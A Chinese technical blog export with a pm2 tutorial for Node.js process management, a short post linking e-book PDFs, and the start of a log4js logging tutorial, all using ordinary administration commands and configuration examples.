<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g pm2</span><br></pre></td></tr></table></figure>
<h2 id="目录介绍"><a href="#目录介绍" class="headerlink" title="目录介绍"></a>目录介绍</h2><p>pm2安装好后，会自动创建下面目录。看文件名基本就能知道基本意思了。</p>
<ol>
<li>$HOME/.pm2 will contain all PM2 related files</li>
<li>$HOME/.pm2/logs will contain all applications logs</li>
<li>$HOME/.pm2/pids will contain all applications pids</li>
<li>$HOME/.pm2/pm2.log PM2 logs</li>
<li>$HOME/.pm2/pm2.pid PM2 pid</li>
<li>$HOME/.pm2/rpc.sock Socket file for remote commands</li>
<li>$HOME/.pm2/pub.sock Socket file for publishable events</li>
<li>$HOME/.pm2/conf.js PM2 Configuration</li>
</ol>
<p>一般我们都是通过npm start启动应用，其实就是调用node ./bin/www。那么，换成pm2就是注意，这里用了–watch参数，意味着当你的express应用代码发生变化时，pm2会帮你重启服务。</p>
<p>入门也很简单，可以参考官方文档：<a href="http://pm2.keymetrics.io/docs/usage/quick-start。" target="_blank" rel="noopener">http://pm2.keymetrics.io/docs/usage/quick-start。</a></p>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>参数说明：</p>
<ol>
<li>–watch：监听应用目录的变化，一旦发生变化，自动重启。如果要精确监听、不见听的目录，最好通过配置文件。</li>
<li>-i –instances：启用多少个实例，可用于负载均衡。如果-i 0或者-i max，则根据当前机器核数确定实例数目。</li>
<li>–ignore-watch：排除监听的目录/文件，可以是特定的文件名，也可以是正则。比如4. –ignore-watch=”test node_modules “some scripts””</li>
<li>-n –name：应用的名称。查看应用信息的时候可以用到。</li>
<li>-o –output <path>：标准输出日志文件的路径。</path></li>
<li>-e –error <path>：错误输出日志文件的路径。</path></li>
<li>–interpreter <interpreter>：the interpreter pm2 should use for executing app (bash, python…)。比如你用的coffee script来编写应用。</interpreter></li>
</ol>
<p>完整命令行参数列表：地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --watch -i 2</span><br></pre></td></tr></table></figure></p>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 restart app.js</span><br></pre></td></tr></table></figure>
<h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h2><p>停止特定的应用。可以先通过pm2 list获取应用的名字（–name指定的）或者进程id。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 stop app_name|app_id</span><br></pre></td></tr></table></figure></p>
<p>如果要停止所有应用，可以<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 stop all</span><br></pre></td></tr></table></figure></p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>类似pm2 stop，如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 stop app_name|app_id</span><br><span class="line">pm2 stop all</span><br></pre></td></tr></table></figure></p>
<h2 id="查看进程状态"><a href="#查看进程状态" class="headerlink" title="查看进程状态"></a>查看进程状态</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 list</span><br></pre></td></tr></table></figure>
<h2 id="查看某个进程的信息"><a href="#查看某个进程的信息" class="headerlink" title="查看某个进程的信息"></a>查看某个进程的信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ94wb7tioqZ pids]# pm2 describe 0</span><br><span class="line">Describing process with id 0 - name oc-server</span><br><span class="line">┌───────────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ status            │ online                                                       │</span><br><span class="line">│ name              │ oc-server                                                    │</span><br><span class="line">│ id                │ 0                                                            │</span><br><span class="line">│ path              │ /data/file/qiquan/over_the_counter/server/bin/www            │</span><br><span class="line">│ args              │                                                              │</span><br><span class="line">│ exec cwd          │ /data/file/qiquan/over_the_counter/server                    │</span><br><span class="line">│ error log path    │ /data/file/qiquan/over_the_counter/server/logs/app-err-0.log │</span><br><span class="line">│ out log path      │ /data/file/qiquan/over_the_counter/server/logs/app-out-0.log │</span><br><span class="line">│ pid path          │ /root/.pm2/pids/oc-server-0.pid                              │</span><br><span class="line">│ mode              │ fork_mode                                                    │</span><br><span class="line">│ node v8 arguments │                                                              │</span><br><span class="line">│ watch &amp; reload    │                                                             │</span><br><span class="line">│ interpreter       │ node                                                         │</span><br><span class="line">│ restarts          │ 293                                                          │</span><br><span class="line">│ unstable restarts │ 0                                                            │</span><br><span class="line">│ uptime            │ 87m                                                          │</span><br><span class="line">│ created at        │ 2016-08-26T08:13:43.705Z                                     │</span><br><span class="line">└───────────────────┴──────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h1 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h1><ol>
<li>配置文件里的设置项，跟命令行参数基本是一一对应的。</li>
<li>可以选择yaml或者json文件，就看个人喜好了。</li>
<li>json格式的配置文件，pm2当作普通的js文件来处理，所以可以在里面添加注释或者编写代码，这对于动态调整配置很有好处。</li>
<li>如果启动的时候指定了配置文件，那么命令行参数会被忽略。（个别参数除外，比如–env</li>
</ol>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>举个简单例子，完整配置说明请参考官方文档。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>        : <span class="string">"fis-receiver"</span>,  <span class="comment">// 应用名称</span></span><br><span class="line">  <span class="attr">"script"</span>      : <span class="string">"./bin/www"</span>,  <span class="comment">// 实际启动脚本</span></span><br><span class="line">  <span class="attr">"cwd"</span>         : <span class="string">"./"</span>,  <span class="comment">// 当前工作路径</span></span><br><span class="line">  <span class="attr">"watch"</span>: [  <span class="comment">// 监控变化的目录，一旦变化，自动重启</span></span><br><span class="line">    <span class="string">"bin"</span>,</span><br><span class="line">    <span class="string">"routers"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"ignore_watch"</span> : [  <span class="comment">// 从监控目录中排除</span></span><br><span class="line">    <span class="string">"node_modules"</span>, </span><br><span class="line">    <span class="string">"logs"</span>,</span><br><span class="line">    <span class="string">"public"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"watch_options"</span>: &#123;</span><br><span class="line">    <span class="attr">"followSymlinks"</span>: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"error_file"</span> : <span class="string">"./logs/app-err.log"</span>,  <span class="comment">// 错误日志路径</span></span><br><span class="line">  <span class="attr">"out_file"</span>   : <span class="string">"./logs/app-out.log"</span>,  <span class="comment">// 普通日志路径</span></span><br><span class="line">  <span class="attr">"env"</span>: &#123;</span><br><span class="line">      <span class="attr">"NODE_ENV"</span>: <span class="string">"production"</span>  <span class="comment">// 环境参数，当前指定为生产环境</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="自动重启"><a href="#自动重启" class="headerlink" title="自动重启"></a>自动重启</h1><p>前面已经提到了，这里贴命令行，更多点击这里。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --watch</span><br></pre></td></tr></table></figure></p>
<p>这里是监控整个项目的文件，如果只想监听指定文件和目录，建议通过配置文件的watch、ignore_watch字段来设置。</p>
<h1 id="环境切换"><a href="#环境切换" class="headerlink" title="环境切换"></a>环境切换</h1><p>在实际项目开发中，我们的应用经常需要在多个环境下部署，比如开发环境、测试环境、生产环境等。在不同环境下，有时候配置项会有差异，比如链接的数据库地址不同等。</p>
<p>对于这种场景，pm2也是可以很好支持的。首先通过在配置文件中通过env_xx来声明不同环境的配置，然后在启动应用时，通过–env参数指定运行的环境。</p>
<h2 id="环境配置声明"><a href="#环境配置声明" class="headerlink" title="环境配置声明"></a>环境配置声明</h2><p>首先，在配置文件中，通过env选项声明多个环境配置。简单说明下：</p>
<p>env为默认的环境配置（生产环境），env_dev、env_test则分别是开发、测试环境。可以看到，不同环境下的NODE_ENV、REMOTE_ADDR字段的值是不同的。</p>
<p>在应用中，可以通过process.env.REMOTE_ADDR等来读取配置中生命的变量。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"env": &#123;</span><br><span class="line">  "NODE_ENV": "production",</span><br><span class="line">  "REMOTE_ADDR": "http://www.example.com/"</span><br><span class="line">&#125;,</span><br><span class="line">"env_dev": &#123;</span><br><span class="line">  "NODE_ENV": "development",</span><br><span class="line">  "REMOTE_ADDR": "http://wdev.example.com/"</span><br><span class="line">&#125;,</span><br><span class="line">"env_test": &#123;</span><br><span class="line">  "NODE_ENV": "test",</span><br><span class="line">  "REMOTE_ADDR": "http://wtest.example.com/"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="启动指明环境"><a href="#启动指明环境" class="headerlink" title="启动指明环境"></a>启动指明环境</h2><p>假设通过下面启动脚本（开发环境），那么，此时process.env.REMOTE_ADDR的值就是相应的 <a href="http://wdev.example.com/" target="_blank" rel="noopener">http://wdev.example.com/</a> ，可以自己试验下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --env dev</span><br></pre></td></tr></table></figure></p>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>命令如下，表示开启三个进程。如果-i 0，则会根据机器当前核数自动开启尽可能多的进程。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js -i 3 # 开启三个进程</span><br><span class="line">pm2 start app.js -i max # 根据机器CPU核数，开启对应数目的进程</span><br></pre></td></tr></table></figure></p>
<h2 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h2><p>除了可以打开日志文件查看日志外，还可以通过pm2 logs来查看实时日志。这点对于线上问题排查非常重要。</p>
<p>比如某个node服务突然异常重启了，那么可以通过pm2提供的日志工具来查看实时日志，看是不是脚本出错之类导致的异常重启。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 logs</span><br></pre></td></tr></table></figure></p>
<h2 id="指令tab补全"><a href="#指令tab补全" class="headerlink" title="指令tab补全"></a>指令tab补全</h2><p>运行pm2 –help，可以看到pm2支持的子命令还是蛮多的，这个时候，自动完成的功能就很重要了。</p>
<p>运行如下命令。恭喜，已经能够通过tab自动补全了。细节可参考这里。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 completion install</span><br><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure></p>
<h2 id="开机自动启动"><a href="#开机自动启动" class="headerlink" title="开机自动启动"></a>开机自动启动</h2><p>可以通过pm2 startup来实现开机自启动。细节可参考。大致流程如下</p>
<ol>
<li>通过pm2 save保存当前进程状态。</li>
<li>通过pm2 startup [platform]生成开机自启动的命令。（记得查看控制台输出）</li>
<li>将步骤2生成的命令，粘贴到控制台进行，搞定。</li>
</ol>
<h2 id="传入node-args"><a href="#传入node-args" class="headerlink" title="传入node args"></a>传入node args</h2><p>直接上例子，分别是通过命令行和配置文件。</p>
<p>命令行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --node-args=&quot;--harmony&quot;</span><br></pre></td></tr></table></figure></p>
<p>配置文件：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span> : <span class="string">"oc-server"</span>,</span><br><span class="line">  <span class="attr">"script"</span> : <span class="string">"app.js"</span>,</span><br><span class="line">  <span class="attr">"node_args"</span> : <span class="string">"--harmony"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>假设是在centos下，那么运行如下命令，搞定。强烈建议运行完成之后，重启机器，看是否设置成功。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ94wb7tioqZ option_analysis]# pm2 save</span><br><span class="line">[root@iZ94wb7tioqZ option_analysis]# pm2 startup centos</span><br><span class="line">[PM2] Generating system init script in /etc/init.d/pm2-init.sh</span><br><span class="line">[PM2] Making script booting at startup...</span><br><span class="line">[PM2] /var/lock/subsys/pm2-init.sh lockfile has been added</span><br><span class="line">[PM2] -centos- Using the command:</span><br><span class="line">      su -c &quot;chmod +x /etc/init.d/pm2-init.sh; chkconfig --add pm2-init.sh&quot;</span><br><span class="line"></span><br><span class="line">[PM2] Done.</span><br><span class="line">[root@iZ94wb7tioqZ option_analysis]# pm2 save</span><br><span class="line">[PM2] Dumping processes</span><br></pre></td></tr></table></figure></p>
<h1 id="远程部署"><a href="#远程部署" class="headerlink" title="远程部署"></a>远程部署</h1><p>可参考官方文档，配置不复杂</p>
<p>官方文档：<a href="http://pm2.keymetrics.io/docs/usage/deployment/#getting-started" target="_blank" rel="noopener">http://pm2.keymetrics.io/docs/usage/deployment/#getting-started</a></p>
<h1 id="监控-monitor"><a href="#监控-monitor" class="headerlink" title="监控(monitor)"></a>监控(monitor)</h1><p>运行如下命令，查看当前通过pm2运行的进程的状态。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 monit</span><br></pre></td></tr></table></figure></p>
<p>看到类似输出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@oneday-dev0 server]# pm2 monit</span><br><span class="line">⌬ PM2 monitoring (To go further check out https://app.keymetrics.io) </span><br><span class="line">                                       [                              ] 0 %</span><br><span class="line">⌬ PM2 monitoring (To go further check o[|||||||||||||||               ] 196.285 MB  </span><br><span class="line"></span><br><span class="line"> ● fis-receiver                        [                              ] 0 %</span><br><span class="line">[1] [fork_mode]                        [|||||                         ] 65.773 MB  </span><br><span class="line"></span><br><span class="line"> ● www                                 [                              ] 0 %</span><br><span class="line">[2] [fork_mode]                        [|||||                         ] 74.426 MB  </span><br><span class="line"></span><br><span class="line"> ● oc-server                           [                              ] 0 %</span><br><span class="line">[3] [fork_mode]                        [||||                          ] 57.801 MB  </span><br><span class="line"></span><br><span class="line"> ● pm2-http-interface                  [                              ] stopped</span><br><span class="line">[4] [fork_mode]                        [                              ] 0 B   </span><br><span class="line"></span><br><span class="line"> ● start-production</span><br><span class="line">[5] [fork_mode]</span><br></pre></td></tr></table></figure></p>
<h1 id="内存使用超过上限自动重启"><a href="#内存使用超过上限自动重启" class="headerlink" title="内存使用超过上限自动重启"></a>内存使用超过上限自动重启</h1><p>如果想要你的应用，在超过使用内存上限后自动重启，那么可以加上–max-memory-restart参数。（有对应的配置项）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start big-array.js --max-memory-restart 20M</span><br></pre></td></tr></table></figure></p>
<h1 id="更新pm2"><a href="#更新pm2" class="headerlink" title="更新pm2"></a>更新pm2</h1><p>官方文档：<a href="http://pm2.keymetrics.io/docs/usage/update-pm2/#updating-pm2" target="_blank" rel="noopener">http://pm2.keymetrics.io/docs/usage/update-pm2/#updating-pm2</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pm2 save # 记得保存进程状态</span><br><span class="line">$ npm install pm2 -g</span><br><span class="line">$ pm2 update</span><br></pre></td></tr></table></figure></p>
<h1 id="pm2-nginx"><a href="#pm2-nginx" class="headerlink" title="pm2 + nginx"></a>pm2 + nginx</h1><p>在nginx上做个反向代理配置，直接贴配置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upstream my_nodejs_upstream &#123;</span><br><span class="line">    server 127.0.0.1:3001;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name my_nodejs_server;</span><br><span class="line">    root /home/www/project_root;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-NginX-Proxy true;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">        proxy_max_temp_file_size 0;</span><br><span class="line">        proxy_pass http://my_nodejs_upstream/;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_read_timeout 240s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>官方文档：<a href="http://pm2.keymetrics.io/docs/tutorials/pm2-nginx-production-setup" target="_blank" rel="noopener">http://pm2.keymetrics.io/docs/tutorials/pm2-nginx-production-setup</a></p>
<h2 id="在线监控系统"><a href="#在线监控系统" class="headerlink" title="在线监控系统"></a>在线监控系统</h2><p>收费服务，使用超级简单，可以方便的对进程的服务情况进行监控。</p>
<h2 id="pm2编程接口"><a href="#pm2编程接口" class="headerlink" title="pm2编程接口"></a>pm2编程接口</h2><p>如果想把pm2的进程监控，跟其他自动化流程整合起来，pm2的编程接口就很有用了。细节可参考官方文档：<br><a href="http://pm2.keymetrics.io/docs/usage/pm2-api/" target="_blank" rel="noopener">http://pm2.keymetrics.io/docs/usage/pm2-api/</a></p>
<h2 id="模块扩展系统"><a href="#模块扩展系统" class="headerlink" title="模块扩展系统"></a>模块扩展系统</h2><p>pm2支持第三方扩展，比如常用的log rotate等。可参考官方文档。</p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>pm2的文档已经写的很好了，学习成本很低，即使是没用过pm2的小伙伴，基本上照着getting started的例子就可以把项目给跑起来，所以文中不少地方都是建议直接参看官方文档。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>pm2</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书整理</title>
    <url>/2019/07/13/%E7%94%B5%E5%AD%90%E4%B9%A6%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>供学习、交流之用，严禁商业用途。</p>
<a id="more"></a>
<p><a href="https://mfaying.github.io/static/e-books/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode.js.pdf" target="_blank" rel="noopener">深入浅出node.js.pdf</a></p>
<p><a href="https://mfaying.github.io/static/e-books/Spark%E5%BF%AB%E9%80%9F%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">Spark快速大数据分析.pdf</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>电子书</tag>
      </tags>
  </entry>
  <entry>
    <title>node.js日志组件log4js</title>
    <url>/2019/07/15/node-js%E6%97%A5%E5%BF%97%E7%BB%84%E4%BB%B6log4js/</url>
    <content><![CDATA[<p>参考:<br><a href="https://blog.csdn.net/hfty290/article/details/42843737" target="_blank" rel="noopener">Log4js配置详解</a><br><a href="https://zhuanlan.zhihu.com/p/22110802" target="_blank" rel="noopener">Node.js 之 log4js 完全讲解</a></p>
<p>log4js 是 Node.js 日志处理的模块，支持日志分级、日志分类、日志落盘。</p>
<a id="more"></a>
<h2 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line">log4js.configure(&#123;</span><br><span class="line">  appenders: &#123;</span><br><span class="line">    out: &#123; <span class="attr">type</span>: <span class="string">'stdout'</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  categories: &#123;</span><br><span class="line">    <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'out'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = log4js.getLogger();</span><br><span class="line">logger.info(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br></pre></td></tr></table></figure>
<p>运行控制台输出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2019-07-15T10:20:30.398] [INFO] default - test</span><br></pre></td></tr></table></figure></p>
<p>调用 .getLogger() 可以获得 log4js 的 Logger 实例，这个实例的用法与 console 是一致的，可以调用.debug（也有 .info、.error 等方法）来输出日志。<br>这里的配置我们后文会一一介绍，接下让我们先熟悉几个 log4js 中的概念。</p>
<h2 id="Level"><a href="#Level" class="headerlink" title="Level"></a>Level</h2><p>这个理解起来不难，就是日志的分级。日志有了分级，log4js 才能更好地为我们展示日志（不同级别的日志在控制台中采用不同的颜色，比如 error 通常是红色的），在生产可以有选择的落盘日志，比如避免一些属于.debug才用的敏感信息被泄露出来。</p>
<p>log4js 的日志分为九个等级，各个级别的名字和权重如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALL: new Level(Number.MIN_VALUE, &quot;ALL&quot;),</span><br><span class="line">TRACE: new Level(5000, &quot;TRACE&quot;),</span><br><span class="line">DEBUG: new Level(10000, &quot;DEBUG&quot;),</span><br><span class="line">INFO: new Level(20000, &quot;INFO&quot;),</span><br><span class="line">WARN: new Level(30000, &quot;WARN&quot;),</span><br><span class="line">ERROR: new Level(40000, &quot;ERROR&quot;),</span><br><span class="line">FATAL: new Level(50000, &quot;FATAL&quot;),</span><br><span class="line">MARK: new Level(9007199254740992, &quot;MARK&quot;), // 2^53</span><br><span class="line">OFF: new Level(Number.MAX_VALUE, &quot;OFF&quot;)</span><br></pre></td></tr></table></figure>
<p>ALL OFF 这两个等级并不会直接在业务代码中使用。剩下的七个即分别对应 Logger 实例的七个方法，.trace .debug .info …。也就是说，你在调用这些方法的时候，就相当于为这些日志定了级。因此，之前的 [2016-08-21 00:01:24.852] [DEBUG] [default] - Time: 2016-08-20T16:01:24.852Z 中的 DEBUG 既是这条日志的级别。</p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>log4js 还有一个概念就是 category（类型），你可以设置一个 Logger 实例的类型，按照另外一个维度来区分日志：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = log4js.getLogger(<span class="string">'example'</span>);</span><br><span class="line">logger.debug(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br></pre></td></tr></table></figure></p>
<p>在通过 getLogger 获取 Logger 实例时，唯一可以传的一个参数就是 loggerCategory（如’example’），通过这个参数来指定 Logger 实例属于哪个类别。</p>
<p>我们修改一下之前的例子<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line">log4js.configure(&#123;</span><br><span class="line">  appenders: &#123;</span><br><span class="line">    out: &#123; <span class="attr">type</span>: <span class="string">'stdout'</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  categories: &#123;</span><br><span class="line">    <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'out'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = log4js.getLogger(<span class="string">'example'</span>);</span><br><span class="line">logger.info(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br></pre></td></tr></table></figure></p>
<p>运行后控制台输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2019-07-15T10:31:05.149] [INFO] example - Time: 2019-07-15T02:31:05.149Z</span><br></pre></td></tr></table></figure></p>
<p>[default] 变成了 example<br>类别比级别更为灵活，为日志了提供了第二个区分的维度。</p>
<h2 id="Appender"><a href="#Appender" class="headerlink" title="Appender"></a>Appender</h2><p>在 log4js 中，日志的出口问题（即日志输出到哪里）由 Appender 来解决。</p>
<p>默认 appender<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// log4js.js</span></span><br><span class="line">defaultConfig = &#123;</span><br><span class="line">  appenders: [&#123;</span><br><span class="line">    type: <span class="string">"console"</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在没有对 log4js 进行任何配置的时候，默认将日志都输出到了控制台。我们可以通过log4js.configure来设置我们想要的 appender，我们修改一下之前的配置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line">log4js.configure(&#123;</span><br><span class="line">  appenders: &#123;</span><br><span class="line">    out: &#123; <span class="attr">type</span>: <span class="string">'stdout'</span> &#125;,</span><br><span class="line">    file: &#123;</span><br><span class="line">      type: <span class="string">'file'</span>,</span><br><span class="line">      filename: <span class="string">'default.log'</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  categories: &#123;</span><br><span class="line">    <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'file'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = log4js.getLogger(<span class="string">'custom-appender'</span>);</span><br><span class="line">logger.info(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br></pre></td></tr></table></figure>
<p>运行代码，log4js 在当前目录创建了一个名为default.log 文件，[2019-07-15T10:45:35.192] [INFO] custom-appender - Time: 2019-07-15T02:45:35.192Z输出到了该文件中。</p>
<p>Console 和 File 都是 log4js 提供的 appender，除此之外还有：</p>
<ol>
<li>DateFile：日志输出到文件，日志文件可以安特定的日期模式滚动，例如今天输出到default-2016-08-21.log，明天输出到 default-2016-08-22.log；</li>
<li>SMTP：输出日志到邮件；</li>
<li>Mailgun：通过 Mailgun API 输出日志到 Mailgun；</li>
<li>levelFilter 可以通过 level 过滤；<br>等等其他一些 appender，到<a href="https://github.com/log4js-node/log4js-node" target="_blank" rel="noopener">这里</a>可以看到全部的列表。</li>
</ol>
<p>过滤级别和类别</p>
<p>我们可以调整 appender 的配置，对日志的级别和类别进行过滤：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> log4js = <span class="built_in">require</span>(<span class="string">'log4js'</span>);</span><br><span class="line"></span><br><span class="line">log4js.addLayout(<span class="string">'json'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">logEvent</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(logEvent);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">log4js.configure(&#123;</span><br><span class="line">  appenders: &#123;</span><br><span class="line">    consoleJson: &#123; <span class="attr">type</span>: <span class="string">'console'</span>, <span class="attr">layout</span>: &#123; <span class="attr">type</span>: <span class="string">'json'</span> &#125; &#125;,</span><br><span class="line">    <span class="built_in">console</span>: &#123; <span class="attr">type</span>: <span class="string">'console'</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  categories: &#123;</span><br><span class="line">    <span class="keyword">default</span>: &#123; <span class="attr">appenders</span>: [<span class="string">'console'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;,</span><br><span class="line">    all: &#123; <span class="attr">appenders</span>: [<span class="string">'consoleJson'</span>, <span class="string">'console'</span>], <span class="attr">level</span>: <span class="string">'info'</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger1 = log4js.getLogger();</span><br><span class="line"><span class="keyword">const</span> logger2 = log4js.getLogger(<span class="string">'all'</span>);</span><br><span class="line">logger1.debug(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">logger2.info(<span class="string">"Time:"</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">log4js.shutdown(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;startTime&quot;:&quot;2019-07-15T13:53:28.174Z&quot;,&quot;categoryName&quot;:&quot;all&quot;,&quot;data&quot;:[&quot;Time:&quot;,&quot;2019-07-15T13:53:28.174Z&quot;],&quot;level&quot;:&#123;&quot;level&quot;:20000,&quot;levelStr&quot;:&quot;INFO&quot;,&quot;colour&quot;:&quot;green&quot;&#125;,&quot;context&quot;:&#123;&#125;,&quot;pid&quot;:12642&#125;</span><br><span class="line">[2019-07-15T21:53:28.174] [INFO] all - Time: 2019-07-15T13:53:28.174Z</span><br></pre></td></tr></table></figure></p>
<ol>
<li>使用 level 来对日志的级别进行过滤，所有权重大于或者等于info的日志将会输出。这也是之前提到的日志级别权重的意义；</li>
<li>通过 category 来选择要输出日志的类别，该配置也接受一个数组，例如 [‘consoleJson’, ‘console’]，这样配置两个类别的日志都将输出到文件中。</li>
</ol>
